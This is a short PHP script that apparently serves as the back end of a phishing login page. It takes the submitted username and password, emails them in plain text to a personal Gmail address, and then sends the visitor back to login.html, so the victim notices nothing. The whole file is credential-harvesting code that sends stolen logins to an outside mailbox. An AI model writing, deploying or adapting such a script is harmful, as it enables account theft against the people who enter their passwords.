<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Obter os dados do formulário
    $user = $_POST["user"];
    $pass = $_POST["pass"];
    
    // Endereço de e-mail para onde os dados serão enviados
    $to = "emanuelcrvlh@gmail.com";
    $subject = "Dados de Login";
    $message = "Usuário: $user\nSenha: $pass";
    
    // Enviar e-mail
    mail($to, $subject, $message);
    
    // Redirecionar de volta para a página de login
    header("Location: login.html");
    exit;
}
?>